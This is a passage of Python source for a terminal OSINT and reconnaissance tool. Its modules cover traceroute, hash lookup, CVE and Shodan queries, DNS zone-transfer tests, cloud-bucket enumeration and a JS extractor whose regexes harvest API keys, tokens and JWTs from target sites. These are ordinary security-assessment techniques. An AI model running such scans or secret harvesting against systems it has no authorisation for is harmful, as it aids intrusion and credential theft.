    for i, (dork, desc) in enumerate(dorks, 1):
        print(f"  {C}{i:>3}.{RST} {Y}{desc}{RST}")
        print(f"       {W}{dork}{RST}")
        print()


# ─── 21. Traceroute ──────────────────────────────────────────────────────────

def traceroute():
    print_header("Traceroute")
    if not _stealth_raw_socket_warning("Traceroute"):
        return
    host = prompt("Target host (IP or domain)")
    if not host:
        return

    spinner("Resolving host...", 0.5)
    try:
        if STEALTH["enabled"] and dns is not None:
            answers = dns.resolver.resolve(host, "A", lifetime=10)
            dest_ip = str(answers[0])
        else:
            dest_ip = socket.gethostbyname(host)
        print_row("Target", f"{host} ({dest_ip})")
    except Exception:
        print_err("Could not resolve hostname")
        return

    print_warn("Running traceroute (max 30 hops, may take a moment)...")
    print()

    port = 33434
    max_hops = 30
    timeout_s = 2

    for ttl in range(1, max_hops + 1):
        recv_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        recv_sock.settimeout(timeout_s)

        send_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        send_sock.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, ttl)

        start = time.time()
        send_sock.sendto(b"", (dest_ip, port))

        addr = None
        try:
            _, addr_info = recv_sock.recvfrom(512)
            addr = addr_info[0]
            rtt = (time.time() - start) * 1000
        except socket.timeout:
            rtt = None

        send_sock.close()
        recv_sock.close()

        if addr:
            try:
                hostname = socket.gethostbyaddr(addr)[0]
                print(f"  {C}{ttl:>3}{RST}  {W}{addr:<16}{RST} ({hostname})  {G}{rtt:.1f} ms{RST}")
            except socket.herror:
                print(f"  {C}{ttl:>3}{RST}  {W}{addr:<16}{RST}  {G}{rtt:.1f} ms{RST}")

            if addr == dest_ip:
                print_ok("Destination reached!")
                break
        else:
            print(f"  {C}{ttl:>3}{RST}  {Y}*  *  *  (timeout){RST}")

    port += 1


# ─── 22. Hash Identifier & Lookup ────────────────────────────────────────────

def hash_lookup():
    print_header("Hash Identifier & Lookup")
    hash_val = prompt("Hash value")
    if not hash_val:
        return

    hash_val = hash_val.strip()
    length = len(hash_val)

    # Identify hash type
    hash_types = []
    if re.match(r"^[a-fA-F0-9]+$", hash_val):
        type_map = {
            32: ["MD5", "NTLM"],
            40: ["SHA-1"],
            56: ["SHA-224"],
            64: ["SHA-256"],
            96: ["SHA-384"],
            128: ["SHA-512"],
        }
        hash_types = type_map.get(length, [f"Unknown ({length} hex chars)"])
    elif hash_val.startswith("$2b$") or hash_val.startswith("$2a$"):
        hash_types = ["bcrypt"]
    elif hash_val.startswith("$6$"):
        hash_types = ["SHA-512 (Unix crypt)"]
    elif hash_val.startswith("$5$"):
        hash_types = ["SHA-256 (Unix crypt)"]
    elif hash_val.startswith("$1$"):
        hash_types = ["MD5 (Unix crypt)"]
    else:
        hash_types = ["Unknown format"]

    print_row("Hash", hash_val[:50] + ("..." if len(hash_val) > 50 else ""))
    print_row("Length", str(length))
    print_row("Possible Type(s)", ", ".join(hash_types))

    # Try to look up hash online
    spinner("Searching online databases...", 1.0)
    found = False

    # Try md5decrypt.net/Api
    if length == 32:
        try:
            resp = requests.get(
                f"https://www.nitrxgen.net/md5db/{hash_val}",
                timeout=8,
            )
            if resp.status_code == 200 and resp.text.strip():
                print_ok(f"Plaintext found: {G}{resp.text.strip()}{RST}")
                found = True
        except Exception:
            pass

    if not found:
        print_warn("Hash not found in online databases")
        print_warn("Try: https://crackstation.net/ or https://hashes.com/")


# ─── 23. ASN Lookup ──────────────────────────────────────────────────────────

def asn_lookup():
    print_header("ASN Lookup")
    query = prompt("ASN number or IP (e.g. AS15169 or 8.8.8.8)")
    if not query:
        return

    spinner("Querying ASN info...", 0.8)

    # If it's an IP, look up its ASN first
    if not query.upper().startswith("AS"):
        try:
            resp = requests.get(f"https://api.bgpview.io/ip/{query}", timeout=10)
            data = resp.json().get("data", {})
            prefixes = data.get("prefixes", [])
            if prefixes:
                asn = prefixes[0].get("asn", {}).get("asn")
                print_row("IP", query)
                print_row("Prefix", prefixes[0].get("prefix", "N/A"))
                print_row("ASN", str(asn))
                query = str(asn)
            else:
                print_err("No ASN data found for this IP")
                return
        except Exception as e:
            print_err(f"Error: {e}")
            return
    else:
        query = query.upper().replace("AS", "")

    try:
        resp = requests.get(f"https://api.bgpview.io/asn/{query}", timeout=10)
        data = resp.json().get("data", {})
        print_row("ASN", f"AS{data.get('asn', query)}")
        print_row("Name", data.get("name", "N/A"))
        print_row("Description", data.get("description_short", "N/A"))
        print_row("Country", data.get("country_code", "N/A"))
        print_row("Website", data.get("website", "N/A"))
        print_row("Email", data.get("email_contacts", ["N/A"])[0] if data.get("email_contacts") else "N/A")
        print_row("RIR", data.get("rir_allocation", {}).get("rir_name", "N/A"))
        print_row("Allocated", data.get("rir_allocation", {}).get("date_allocated", "N/A"))

        # Get prefixes
        resp2 = requests.get(f"https://api.bgpview.io/asn/{query}/prefixes", timeout=10)
        prefix_data = resp2.json().get("data", {})
        v4 = prefix_data.get("ipv4_prefixes", [])
        v6 = prefix_data.get("ipv6_prefixes", [])
        print_row("IPv4 Prefixes", str(len(v4)))
        print_row("IPv6 Prefixes", str(len(v6)))
        if v4:
            print(f"\n  {Y}IPv4 Prefixes (first 10):{RST}")
            for p in v4[:10]:
                print(f"    {C}•{RST} {p.get('prefix', 'N/A')} — {p.get('description', '')}")
    except Exception as e:
        print_err(f"Error: {e}")


# ─── 24. Website Screenshot ──────────────────────────────────────────────────

def website_screenshot():
    print_header("Website Screenshot")
    url = prompt("URL (e.g. https://example.com)")
    if not url:
        return
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    spinner("Generating screenshot via API...", 1.5)
    try:
        import urllib.parse
        encoded = urllib.parse.quote(url, safe="")
        screenshot_url = f"https://image.thum.io/get/width/1280/crop/720/{url}"

        print_ok("Screenshot URL generated!")
        print_row("Preview URL", screenshot_url)
        print()

        # Also try to download it
        resp = requests.get(screenshot_url, timeout=20,
                            headers={"User-Agent": "ARGUS OSINT Tool"})
        if resp.status_code == 200 and len(resp.content) > 1000:
            import os
            filename = f"screenshot_{urlparse(url).netloc.replace('.', '_')}.png"
            filepath = os.path.join(os.getcwd(), filename)
            with open(filepath, "wb") as f:
                f.write(resp.content)
            print_ok(f"Screenshot saved: {filepath}")
            print_row("File Size", f"{len(resp.content) / 1024:.1f} KB")
        else:
            print_warn("Could not download screenshot, use the URL above to view")
    except Exception as e:
        print_err(f"Error: {e}")


# ─── 25. Reverse Image Search Links ──────────────────────────────────────────

def reverse_image_search():
    print_header("Reverse Image Search")
    url = prompt("Image URL")
    if not url:
        return

    import urllib.parse
    encoded = urllib.parse.quote(url, safe="")

    spinner("Generating search links...", 0.5)
    engines = {
        "Google Images": f"https://lens.google.com/uploadbyurl?url={encoded}",
        "Yandex Images": f"https://yandex.com/images/search?rpt=imageview&url={encoded}",
        "Bing Visual": f"https://www.bing.com/images/search?view=detailv2&iss=sbi&form=SBIVSP&q=imgurl:{encoded}",
        "TinEye": f"https://tineye.com/search?url={encoded}",
    }

    print_warn("Open these URLs in your browser to perform reverse image searches:\n")
    for name, search_url in engines.items():
        print(f"  {C}{name}:{RST}")
        print(f"    {W}{search_url}{RST}")
        print()

    # Check basic image info
    try:
        resp = requests.head(url, timeout=8, allow_redirects=True,
                             headers={"User-Agent": "ARGUS OSINT Tool"})
        print_row("Content-Type", resp.headers.get("Content-Type", "N/A"))
        size = resp.headers.get("Content-Length", "N/A")
        if size != "N/A":
            print_row("File Size", f"{int(size) / 1024:.1f} KB")
        print_row("Server", resp.headers.get("Server", "N/A"))
    except Exception:
        pass


# ─── 26. CVE Search ──────────────────────────────────────────────────────────

def cve_search():
    print_header("CVE Search")
    query = prompt("Search term (e.g. 'apache 2.4' or 'CVE-2021-44228')")
    if not query:
        return

    spinner("Searching CVE databases...", 1.2)

    if query.upper().startswith("CVE-"):
        # Direct CVE lookup
        try:
            resp = requests.get(
                f"https://cveawg.mitre.org/api/cve/{query.upper()}",
                timeout=10,
            )
            if resp.status_code == 200:
                data = resp.json()
                cna = data.get("containers", {}).get("cna", {})

                print_row("CVE ID", data.get("cveMetadata", {}).get("cveId", query))
                print_row("State", data.get("cveMetadata", {}).get("state", "N/A"))
                print_row("Published", data.get("cveMetadata", {}).get("datePublished", "N/A")[:10])

                descriptions = cna.get("descriptions", [])
                if descriptions:
                    desc = descriptions[0].get("value", "N/A")
                    # Wrap long descriptions
                    while desc:
                        print(f"    {W}{desc[:80]}{RST}")
                        desc = desc[80:]

                metrics = cna.get("metrics", [])
                for m in metrics:
                    cvss = m.get("cvssV3_1") or m.get("cvssV3_0") or m.get("cvssV2_0", {})
                    if cvss:
                        print_row("CVSS Score", str(cvss.get("baseScore", "N/A")))
                        print_row("Severity", cvss.get("baseSeverity", "N/A"))

                affected = cna.get("affected", [])
                for a in affected[:5]:
                    print_row("Product", f"{a.get('vendor', '?')} / {a.get('product', '?')}")
            else:
                print_err(f"CVE not found (HTTP {resp.status_code})")
        except Exception as e:
            print_err(f"Error: {e}")
    else:
        # Keyword search via NIST NVD
        try:
            resp = requests.get(
                f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={query}&resultsPerPage=10",
                timeout=15,
                headers={"User-Agent": "ARGUS OSINT Tool"},
            )
            if resp.status_code == 200:
                data = resp.json()
                total = data.get("totalResults", 0)
                print_row("Total Results", str(total))
                print()

                for vuln in data.get("vulnerabilities", []):
                    cve = vuln.get("cve", {})
                    cve_id = cve.get("id", "N/A")
                    desc = cve.get("descriptions", [{}])[0].get("value", "N/A")
                    metrics = cve.get("metrics", {})
                    score = "N/A"
                    for key in ["cvssMetricV31", "cvssMetricV30", "cvssMetricV2"]:
                        m = metrics.get(key, [])
                        if m:
                            score = str(m[0].get("cvssData", {}).get("baseScore", "N/A"))
                            break

                    print(f"  {R}{cve_id}{RST} (Score: {Y}{score}{RST})")
                    print(f"    {W}{desc[:120]}{RST}")
                    print()
            elif resp.status_code == 403:
                print_warn("NVD API rate limit reached. Try again in a moment.")
            else:
                print_err(f"NVD API error (HTTP {resp.status_code})")
        except Exception as e:
            print_err(f"Error: {e}")


# ─── 27. Paste Search ────────────────────────────────────────────────────────

def paste_search():
    print_header("Paste / Code Search")
    query = prompt("Search term (email, domain, keyword)")
    if not query:
        return

    spinner("Searching paste sites & code repos...", 1.2)

    import urllib.parse
    encoded = urllib.parse.quote(query, safe="")

    print(f"\n  {Y}Search Links (open in browser):{RST}")
    search_links = {
        "GitHub Code": f"https://github.com/search?q={encoded}&type=code",
        "GitHub Commits": f"https://github.com/search?q={encoded}&type=commits",
        "GitLab": f"https://gitlab.com/search?search={encoded}",
        "Grep.app": f"https://grep.app/search?q={encoded}",
        "SearchCode": f"https://searchcode.com/?q={encoded}",
        "Pastebin (Google)": f"https://www.google.com/search?q=site:pastebin.com+{encoded}",
        "Ghostbin (Google)": f"https://www.google.com/search?q=site:ghostbin.com+{encoded}",
    }

    for name, url in search_links.items():
        print(f"\n  {C}{name}:{RST}")
        print(f"    {W}{url}{RST}")

    # Try GitHub search API (no auth needed for basic)
    print(f"\n  {M}── GitHub Code Results ──{RST}")
    try:
        resp = requests.get(
            f"https://api.github.com/search/code?q={encoded}&per_page=5",
            timeout=10,
            headers={"Accept": "application/vnd.github.v3+json"},
        )
        if resp.status_code == 200:
            data = resp.json()
            print_row("Total Results", str(data.get("total_count", 0)))
            for item in data.get("items", [])[:5]:
                repo = item.get("repository", {}).get("full_name", "")
                path = item.get("path", "")
                print(f"    {G}•{RST} {repo}/{path}")
        elif resp.status_code == 422:
            print_warn("GitHub requires authentication for code search")
        else:
            print_warn(f"GitHub search returned {resp.status_code}")
    except Exception:
        print_warn("Could not query GitHub API")


# ─── 28. DNS Zone Transfer Check ─────────────────────────────────────────────

def dns_zone_transfer():
    print_header("DNS Zone Transfer Check (AXFR)")
    domain = prompt("Domain")
    if not domain:
        return

    if not dns:
        print_err("dnspython not installed. Run: pip install dnspython")
        return

    print_warn("This test checks for misconfigured DNS servers.")
    print_warn("Only test domains you have authorization for.")

    spinner("Finding nameservers...", 0.8)
    try:
        ns_records = dns.resolver.resolve(domain, "NS")
        nameservers = [str(ns).rstrip(".") for ns in ns_records]
        print_row("Nameservers", ", ".join(nameservers))
    except Exception as e:
        print_err(f"Could not find nameservers: {e}")
        return

    import dns.zone
    import dns.query

    vulnerable = False
    for ns in nameservers:
        print(f"\n  {M}── Testing {ns} ──{RST}")
        try:
            if STEALTH["enabled"]:
                ns_answers = dns.resolver.resolve(ns, "A", lifetime=10)
                ns_ip = str(ns_answers[0])
            else:
                ns_ip = socket.gethostbyname(ns)
            zone = dns.zone.from_xfr(dns.query.xfr(ns_ip, domain, timeout=5))
            print_err(f"Zone transfer SUCCEEDED on {ns}!")
            vulnerable = True
            names = zone.nodes.keys()
            print_row("Records Found", str(len(names)))
            for name in sorted(names)[:30]:
                print(f"    {R}•{RST} {name}.{domain}")
            if len(names) > 30:
                print(f"    {Y}... and {len(names) - 30} more{RST}")
        except dns.exception.FormError:
            print_ok(f"{ns}: Transfer refused (secure)")
        except Exception as e:
            print_ok(f"{ns}: Transfer failed ({type(e).__name__})")

    if not vulnerable:
        print(f"\n  {G}All nameservers properly refuse zone transfers.{RST}")
    else:
        print(f"\n  {R}VULNERABLE: Zone transfer possible! This is a security issue.{RST}")


# ─── 29. Cipher / SSL Suite Scanner ──────────────────────────────────────────

def ssl_scanner():
    print_header("SSL/TLS Suite Scanner")
    host = prompt("Domain (e.g. example.com)")
    if not host:
        return

    import ssl

    spinner("Testing SSL/TLS protocols...", 1.5)

    protocols = [
        ("TLSv1.3", ssl.PROTOCOL_TLS_CLIENT, ssl.TLSVersion.TLSv1_3),
        ("TLSv1.2", ssl.PROTOCOL_TLS_CLIENT, ssl.TLSVersion.TLSv1_2),
    ]

    for name, proto, min_ver in protocols:
        try:
            ctx = ssl.SSLContext(proto)
            ctx.minimum_version = min_ver
            ctx.maximum_version = min_ver
            ctx.check_hostname = True
            ctx.verify_mode = ssl.CERT_REQUIRED
            ctx.load_default_certs()
            with ctx.wrap_socket(socket.socket(), server_hostname=host) as s:
                s.settimeout(5)
                s.connect((host, 443))
                cipher = s.cipher()
                print_ok(f"{name}: Supported — cipher: {cipher[0]} ({cipher[2]} bits)")
        except ssl.SSLError:
            print_warn(f"{name}: Not supported")
        except Exception as e:
            print_err(f"{name}: Error — {e}")

    # Get full cipher list on default connection
    print(f"\n  {Y}Negotiated Cipher Info:{RST}")
    try:
        ctx = ssl.create_default_context()
        with ctx.wrap_socket(socket.socket(), server_hostname=host) as s:
            s.settimeout(5)
            s.connect((host, 443))
            cipher = s.cipher()
            print_row("Cipher Suite", cipher[0])
            print_row("Protocol", cipher[1])
            print_row("Key Bits", str(cipher[2]))

            # Certificate chain
            cert = s.getpeercert()
            issuer = dict(x[0] for x in cert.get("issuer", ()))
            print_row("Issuer", issuer.get("organizationName", "N/A"))
            print_row("Cert Valid Until", cert.get("notAfter", "N/A"))

            # Show all shared ciphers
            shared = s.shared_ciphers()
            if shared:
                print(f"\n  {Y}Supported Cipher Suites ({len(shared)}):{RST}")
                for c in shared[:20]:
                    bits_str = f"{c[2]} bits" if c[2] else "N/A"
                    print(f"    {C}•{RST} {c[0]} ({c[1]}, {bits_str})")
                if len(shared) > 20:
                    print(f"    {Y}... and {len(shared) - 20} more{RST}")
    except Exception as e:
        print_err(f"Error: {e}")


# ─── 30. Shodan Host Lookup ──────────────────────────────────────────────────

def shodan_lookup():
    print_header("Shodan Host Lookup")
    ip = prompt("IP address")
    if not ip:
        return

    spinner("Querying Shodan InternetDB...", 1.0)
    # Using the free InternetDB API (no key needed)
    try:
        resp = requests.get(f"https://internetdb.shodan.io/{ip}", timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            print_row("IP", data.get("ip", ip))

            ports = data.get("ports", [])
            if ports:
                print_row("Open Ports", ", ".join(str(p) for p in ports))
            else:
                print_row("Open Ports", "None found")

            cpes = data.get("cpes", [])
            if cpes:
                print(f"\n  {Y}CPEs (Software):{RST}")
                for cpe in cpes:
                    print(f"    {C}•{RST} {cpe}")

            vulns = data.get("vulns", [])
            if vulns:
                print(f"\n  {R}Known Vulnerabilities ({len(vulns)}):{RST}")
                for v in vulns[:20]:
                    print(f"    {R}•{RST} {v}")
                if len(vulns) > 20:
                    print(f"    {Y}... and {len(vulns) - 20} more{RST}")
            else:
                print_ok("No known vulnerabilities")

            hostnames = data.get("hostnames", [])
            if hostnames:
                print_row("Hostnames", ", ".join(hostnames))

            tags = data.get("tags", [])
            if tags:
                print_row("Tags", ", ".join(tags))
        elif resp.status_code == 404:
            print_warn("No Shodan data found for this IP")
        else:
            print_err(f"Shodan API error (HTTP {resp.status_code})")
    except Exception as e:
        print_err(f"Error: {e}")


# ─── 31. Favicon Hash Lookup ──────────────────────────────────────────────────

def favicon_hash():
    print_header("Favicon Hash Lookup")
    target = prompt("Domain (e.g. example.com)")
    if not target:
        return

    if not target.startswith(("http://", "https://")):
        target = "https://" + target

    spinner("Fetching favicon...", 1.0)
    urls_to_try = [
        f"{target}/favicon.ico",
        f"{target}/assets/favicon.ico",
        f"{target}/static/favicon.ico",
    ]
    # Also try to find from HTML
    try:
        resp = requests.get(target, timeout=10)
        if resp.status_code == 200 and BeautifulSoup:
            soup = BeautifulSoup(resp.text, "html.parser")
            for link in soup.find_all("link", rel=lambda r: r and "icon" in " ".join(r).lower()):
                href = link.get("href", "")
                if href:
                    if href.startswith("//"):
                        href = "https:" + href
                    elif href.startswith("/"):
                        href = target.rstrip("/") + href
                    elif not href.startswith("http"):
                        href = target.rstrip("/") + "/" + href
                    urls_to_try.insert(0, href)
    except Exception:
        pass

    favicon_data = None
    used_url = None
    for url in urls_to_try:
        try:
            r = requests.get(url, timeout=8)
            if r.status_code == 200 and len(r.content) > 0:
                ct = r.headers.get("Content-Type", "")
                if "html" not in ct.lower():
                    favicon_data = r.content
                    used_url = url
                    break
        except Exception:
            continue

    if not favicon_data:
        print_err("Could not find favicon")
        return

    import base64
    b64_data = base64.encodebytes(favicon_data)
    # MurmurHash3 (simplified 32-bit)
    def mmh3_hash(data):
        import struct as st
        length = len(data)
        nblocks = length // 4
        h1 = 0
        c1 = 0xcc9e2d51
        c2 = 0x1b873593
        for i in range(nblocks):
            k1 = st.unpack_from("<I", data, i * 4)[0]
            k1 = (k1 * c1) & 0xFFFFFFFF
            k1 = ((k1 << 15) | (k1 >> 17)) & 0xFFFFFFFF
            k1 = (k1 * c2) & 0xFFFFFFFF
            h1 ^= k1
            h1 = ((h1 << 13) | (h1 >> 19)) & 0xFFFFFFFF
            h1 = (h1 * 5 + 0xe6546b64) & 0xFFFFFFFF
        tail = data[nblocks * 4:]
        k1 = 0
        if len(tail) >= 3:
            k1 ^= tail[2] << 16
        if len(tail) >= 2:
            k1 ^= tail[1] << 8
        if len(tail) >= 1:
            k1 ^= tail[0]
            k1 = (k1 * c1) & 0xFFFFFFFF
            k1 = ((k1 << 15) | (k1 >> 17)) & 0xFFFFFFFF
            k1 = (k1 * c2) & 0xFFFFFFFF
            h1 ^= k1
        h1 ^= length
        h1 ^= h1 >> 16
        h1 = (h1 * 0x85ebca6b) & 0xFFFFFFFF
        h1 ^= h1 >> 13
        h1 = (h1 * 0xc2b2ae35) & 0xFFFFFFFF
        h1 ^= h1 >> 16
        if h1 & 0x80000000:
            h1 -= 0x100000000
        return h1

    fav_hash = mmh3_hash(b64_data)
    print_row("Favicon URL", used_url)
    print_row("Size", f"{len(favicon_data)} bytes")
    print_row("MMH3 Hash", str(fav_hash))
    print(f"\n  {Y}Shodan Search Query:{RST}")
    print(f"  {G}http.favicon.hash:{fav_hash}{RST}")
    print(f"\n  {C}https://www.shodan.io/search?query=http.favicon.hash%3A{fav_hash}{RST}")


# ─── 32. DMARC / SPF / DKIM Check ───────────────────────────────────────────

def dmarc_spf_dkim():
    print_header("DMARC / SPF / DKIM Check")
    domain = prompt("Domain")
    if not domain:
        return

    if dns is None:
        print_err("dnspython required: pip install dnspython")
        return

    spinner("Checking email security records...", 1.0)

    # SPF
    print(f"\n  {Y}── SPF Record ──{RST}")
    try:
        answers = dns.resolver.resolve(domain, "TXT")
        spf_found = False
        for rdata in answers:
            txt = rdata.to_text().strip('"')
            if "v=spf1" in txt:
                print_ok(f"SPF found: {txt}")
                spf_found = True
                if "~all" in txt:
                    print_warn("Soft fail (~all) – emails may still be delivered")
                elif "-all" in txt:
                    print_ok("Hard fail (-all) – strict policy")
                elif "+all" in txt:
                    print_err("DANGEROUS: +all allows any server to send")
                elif "?all" in txt:
                    print_warn("Neutral (?all) – no policy enforced")
        if not spf_found:
            print_warn("No SPF record found")
    except Exception:
        print_warn("No SPF record found")

    # DMARC
    print(f"\n  {Y}── DMARC Record ──{RST}")
    try:
        answers = dns.resolver.resolve(f"_dmarc.{domain}", "TXT")
        for rdata in answers:
            txt = rdata.to_text().strip('"')
            if "v=DMARC1" in txt:
                print_ok(f"DMARC found: {txt}")
                if "p=reject" in txt:
                    print_ok("Policy: REJECT (strongest)")
                elif "p=quarantine" in txt:
                    print_warn("Policy: QUARANTINE")
                elif "p=none" in txt:
                    print_err("Policy: NONE (monitoring only)")
    except Exception:
        print_warn("No DMARC record found")

    # DKIM (common selectors)
    print(f"\n  {Y}── DKIM Records ──{RST}")
    selectors = ["default", "google", "selector1", "selector2", "dkim", "mail",
                 "k1", "k2", "s1", "s2", "sig1", "smtp", "mandrill", "amazonses",
                 "mailchimp", "sendgrid", "protonmail"]
    found_dkim = False
    for sel in selectors:
        try:
            answers = dns.resolver.resolve(f"{sel}._domainkey.{domain}", "TXT")
            for rdata in answers:
                print_ok(f"DKIM [{sel}]: {rdata.to_text()[:80]}...")
                found_dkim = True
        except Exception:
            continue
    if not found_dkim:
        print_warn("No DKIM records found (common selectors tested)")


# ─── 33. Security.txt Checker ────────────────────────────────────────────────

def security_txt():
    print_header("Security.txt Checker")
    target = prompt("Domain")
    if not target:
        return

    if not target.startswith(("http://", "https://")):
        target = "https://" + target

    spinner("Checking security.txt...", 0.8)

    urls = [
        f"{target}/.well-known/security.txt",
        f"{target}/security.txt",
    ]
    found = False
    for url in urls:
        try:
            resp = requests.get(url, timeout=8)
            if resp.status_code == 200 and len(resp.text.strip()) > 0:
                ct = resp.headers.get("Content-Type", "")
                if "html" not in ct.lower() or resp.text.strip().startswith("Contact:"):
                    print_ok(f"Found at: {url}")
                    print(f"\n  {Y}Content:{RST}")
                    for line in resp.text.strip().split("\n")[:30]:
                        line = line.strip()
                        if line.startswith("#"):
                            print(f"  {C}{line}{RST}")
                        elif ":" in line:
                            key, _, val = line.partition(":")
                            print(f"  {Y}{key}:{RST} {W}{val.strip()}{RST}")
                        else:
                            print(f"  {W}{line}{RST}")
                    found = True
                    break
        except Exception:
            continue

    if not found:
        print_warn("No security.txt found")
        print(f"  {C}Consider creating one: https://securitytxt.org/{RST}")


# ─── 34. HTTP Methods Discovery ──────────────────────────────────────────────

def http_methods():
    print_header("HTTP Methods Discovery")
    target = prompt("Target URL")
    if not target:
        return

    if not target.startswith(("http://", "https://")):
        target = "https://" + target

    spinner("Testing HTTP methods...", 1.0)

    methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE", "CONNECT"]
    allowed = []
    dangerous = []

    # Try OPTIONS first
    try:
        resp = requests.options(target, timeout=8)
        allow_header = resp.headers.get("Allow", "")
        if allow_header:
            print_row("Allow Header", allow_header)
    except Exception:
        pass

    print(f"\n  {Y}Testing individual methods:{RST}")
    for method in methods:
        try:
            resp = requests.request(method, target, timeout=8, allow_redirects=False)
            code = resp.status_code
            if code < 400:
                allowed.append(method)
                if method in ("PUT", "DELETE", "TRACE", "CONNECT"):
                    print(f"    {R}■{RST} {method:<10} → {R}{code} (DANGEROUS){RST}")
                    dangerous.append(method)
                else:
                    print(f"    {G}■{RST} {method:<10} → {G}{code}{RST}")
            elif code == 405:
                print(f"    {Y}■{RST} {method:<10} → {Y}{code} Not Allowed{RST}")
            else:
                print(f"    {W}■{RST} {method:<10} → {W}{code}{RST}")
        except Exception:
            print(f"    {R}■{RST} {method:<10} → {R}Error{RST}")

    if dangerous:
        print(f"\n  {R}WARNING: Dangerous methods enabled: {', '.join(dangerous)}{RST}")
    if "TRACE" in allowed:
        print(f"  {R}TRACE enabled – possible Cross-Site Tracing (XST) attack vector{RST}")


# ─── 35. Cloud Storage Finder ────────────────────────────────────────────────

def cloud_storage_finder():
    print_header("Cloud Storage Finder")
    keyword = prompt("Keyword / Company name")
    if not keyword:
        return

    spinner("Probing cloud storage...", 1.5)

    mutations = [keyword, keyword.lower(), keyword.replace(" ", "-"),
                 keyword.replace(" ", ""), keyword.lower().replace(" ", "-"),
                 f"{keyword}-backup", f"{keyword}-dev", f"{keyword}-staging",
                 f"{keyword}-prod", f"{keyword}-assets", f"{keyword}-data",
                 f"{keyword}-public", f"{keyword}-private", f"{keyword}-media",
                 f"{keyword}-uploads", f"{keyword}-static", f"{keyword}-files"]

    providers = {
        "AWS S3": "https://{}.s3.amazonaws.com",
        "Azure Blob": "https://{}.blob.core.windows.net",
        "GCP Storage": "https://storage.googleapis.com/{}",
        "DigitalOcean Spaces": "https://{}.nyc3.digitaloceanspaces.com",
    }

    found = []
    print(f"\n  {Y}Testing {len(mutations)} mutations across {len(providers)} providers...{RST}\n")

    def check_bucket(name, provider, url_tpl):
        url = url_tpl.format(name)
        try:
            resp = requests.head(url, timeout=5)
            return (provider, name, url, resp.status_code)
        except Exception:
            return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        futures = []
        for name in mutations:
            for provider, tpl in providers.items():
                futures.append(executor.submit(check_bucket, name, provider, tpl))

        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                provider, name, url, code = result
                if code in (200, 403):
                    found.append(result)
                    status = f"{G}OPEN (200)" if code == 200 else f"{Y}EXISTS but 403"
                    print(f"    {G}[+]{RST} {provider}: {W}{name}{RST} → {status}{RST}")
                    print(f"        {C}{url}{RST}")

    if not found:
        print_warn("No cloud storage buckets found")
    else:
        print(f"\n  {Y}Total found: {G}{len(found)}{RST}")
        open_buckets = [f for f in found if f[3] == 200]
        if open_buckets:
            print(f"  {R}WARNING: {len(open_buckets)} bucket(s) are PUBLICLY ACCESSIBLE!{RST}")


# ─── 36. JS Endpoint Extractor ───────────────────────────────────────────────

def js_endpoint_extractor():
    print_header("JS Endpoint Extractor")
    target = prompt("Target URL")
    if not target:
        return

    if not target.startswith(("http://", "https://")):
        target = "https://" + target

    if BeautifulSoup is None:
        print_err("beautifulsoup4 required: pip install beautifulsoup4")
        return

    spinner("Fetching page and scripts...", 1.5)

    try:
        resp = requests.get(target, timeout=10)
    except Exception as e:
        print_err(f"Error fetching page: {e}")
        return

    soup = BeautifulSoup(resp.text, "html.parser")
    scripts = soup.find_all("script")
    js_urls = []
    inline_js = []

    for s in scripts:
        src = s.get("src")
        if src:
            if src.startswith("//"):
                src = "https:" + src
            elif src.startswith("/"):
                parsed = urlparse(target)
                src = f"{parsed.scheme}://{parsed.netloc}{src}"
            elif not src.startswith("http"):
                src = target.rstrip("/") + "/" + src
            js_urls.append(src)
        elif s.string:
            inline_js.append(s.string)

    print_row("JS Files Found", str(len(js_urls)))
    print_row("Inline Scripts", str(len(inline_js)))

    all_js = "\n".join(inline_js)
    for url in js_urls[:20]:
        try:
            r = requests.get(url, timeout=8)
            if r.status_code == 200:
                all_js += "\n" + r.text
        except Exception:
            continue

    # Extract patterns
    patterns = {
        "API Endpoints": r'["\'](?:/api/[^\s"\'<>]+)["\']',
        "Full URLs": r'https?://[^\s"\'<>}{)(\]]+',
        "Relative Paths": r'["\'](?:/[a-zA-Z][a-zA-Z0-9_/.-]{2,})["\']',
        "AWS Keys": r'AKIA[0-9A-Z]{16}',
        "API Keys": r'["\'](?:api[_-]?key|apikey|api_secret|token)["\'][\s]*[:=][\s]*["\']([^"\']+)["\']',
        "Auth Tokens": r'["\'](?:Bearer|Basic)\s+[A-Za-z0-9+/=._-]+["\']',
        "Email Addresses": r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
        "IP Addresses": r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b',
        "JWT Tokens": r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+',
    }

    for label, pattern in patterns.items():
        matches = list(set(re.findall(pattern, all_js)))
        if matches:
            print(f"\n  {Y}── {label} ({len(matches)}) ──{RST}")
            for m in sorted(matches)[:15]:
                m = m.strip("\"'")
                print(f"    {C}•{RST} {m}")
            if len(matches) > 15:
                print(f"    {Y}... and {len(matches) - 15} more{RST}")


# ─── 37. WAF Detector ────────────────────────────────────────────────────────

WAF_SIGNATURES = {
    "Cloudflare": {"headers": ["cf-ray", "cf-cache-status", "cf-request-id"],
                   "cookies": ["__cfduid", "__cf_bm"], "body": ["cloudflare"]},
    "AWS WAF / CloudFront": {"headers": ["x-amz-cf-id", "x-amz-cf-pop"],
                             "cookies": [], "body": ["awselb"]},
    "Akamai": {"headers": ["x-akamai-transformed", "akamai-grn"],
               "cookies": ["akamai"], "body": ["akamai"]},
    "Sucuri": {"headers": ["x-sucuri-id", "x-sucuri-cache"],
               "cookies": ["sucuri"], "body": ["sucuri"]},
    "Imperva / Incapsula": {"headers": ["x-iinfo", "x-cdn"],
                            "cookies": ["visid_incap_", "incap_ses_"], "body": ["incapsula"]},
    "F5 BIG-IP": {"headers": ["x-cnection", "x-wa-info"],
                  "cookies": ["BIGipServer", "TS"], "body": ["bigip"]},
